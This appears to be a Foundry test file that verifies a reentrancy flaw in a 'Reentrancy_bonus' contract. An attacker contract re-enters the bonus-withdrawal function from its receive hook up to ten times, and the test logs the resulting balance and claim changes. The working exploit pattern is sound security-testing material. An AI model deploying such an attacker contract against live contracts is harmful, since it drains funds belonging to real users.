// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrancy_bonus.sol";

contract MaliciousContract {
    Reentrancy_bonus public victim;
    uint256 public attackCount;

    constructor(address _victim) {
        victim = Reentrancy_bonus(_victim);
    }

    function attack() external payable {
        victim.getFirstWithdrawalBonus(address(this));
    }

    receive() external payable {
        if (attackCount < 10) {
            attackCount++;
            victim.getFirstWithdrawalBonus(address(this));
        }
    }
}

contract ReentrancyBonusTest is Test {
    Reentrancy_bonus public bonusContract;
    MaliciousContract public attacker;
    address public owner = makeAddr("owner");
    address public attackerAddr = makeAddr("attacker");

    function setUp() public {
        vm.deal(owner, 100 ether);
        vm.prank(owner);
        bonusContract = new Reentrancy_bonus();
        vm.prank(owner);
        bonusContract.depositFunds{value: 10 ether}();

        attacker = new MaliciousContract(address(bonusContract));
    }

    function testReentrancyAttack() public {
        // BEFORE attack state
        console2.log("--- BEFORE-Trigger State ---");
        uint256 initialContractBalance = address(bonusContract).balance;
        uint256 initialAttackerBalance = address(attacker).balance;
        uint256 initialTotalRewardsDistributed = bonusContract.totalRewardsDistributed();
        uint256 initialTotalBonusClaims = bonusContract.totalBonusClaims();
        uint256 initialUserTotalRewards = bonusContract.userTotalRewards(address(attacker));
        
        console2.log("Contract ETH balance:         ", initialContractBalance);
        console2.log("Attacker ETH balance:         ", initialAttackerBalance);
        console2.log("Total rewards distributed:    ", initialTotalRewardsDistributed);
        console2.log("Total bonus claims:           ", initialTotalBonusClaims);
        console2.log("Attacker user rewards:        ", initialUserTotalRewards);
        
        // EXECUTE attack
        console2.log("--- Trigger Attack ---");
        attacker.attack();
        
        // AFTER attack state
        console2.log("--- AFTER-Trigger State ---");
        uint256 finalContractBalance = address(bonusContract).balance;
        uint256 finalAttackerBalance = address(attacker).balance;
        uint256 finalTotalRewardsDistributed = bonusContract.totalRewardsDistributed();
        uint256 finalTotalBonusClaims = bonusContract.totalBonusClaims();
        uint256 finalUserTotalRewards = bonusContract.userTotalRewards(address(attacker));
        
        console2.log("Contract ETH balance:         ", finalContractBalance);
        console2.log("Attacker ETH balance:         ", finalAttackerBalance);
        console2.log("Total rewards distributed:    ", finalTotalRewardsDistributed);
        console2.log("Total bonus claims:           ", finalTotalBonusClaims);
        console2.log("Attacker user rewards:        ", finalUserTotalRewards);
        
        // Calculate differences
        uint256 contractBalanceDiff = initialContractBalance - finalContractBalance;
        uint256 attackerBalanceDiff = finalAttackerBalance - initialAttackerBalance;
        uint256 rewardsDistributedDiff = finalTotalRewardsDistributed - initialTotalRewardsDistributed;
        uint256 bonusClaimsDiff = finalTotalBonusClaims - initialTotalBonusClaims;
        uint256 userRewardsDiff = finalUserTotalRewards - initialUserTotalRewards;
        
        console2.log("Contract ETH change (decrease):     ", contractBalanceDiff);
        console2.log("Attacker ETH change (increase):     ", attackerBalanceDiff);
        console2.log("Total rewards distributed (change): ", rewardsDistributedDiff);
        console2.log("Total bonus claims (change):        ", bonusClaimsDiff);
        console2.log("Attacker user rewards (change):     ", userRewardsDiff);
        
        // Log attack details
        console2.log("Attack count during reentrancy: ", attacker.attackCount());
        
        // Vulnerability verification
        if (bonusClaimsDiff > 1) {
            console2.log("Vulnerability Exists: Reentrancy exploited - %d bonus claims detected", bonusClaimsDiff);
        } else {
            console2.log("Vulnerability not Exist: Only %d bonus claim executed", bonusClaimsDiff);
        }
    }
}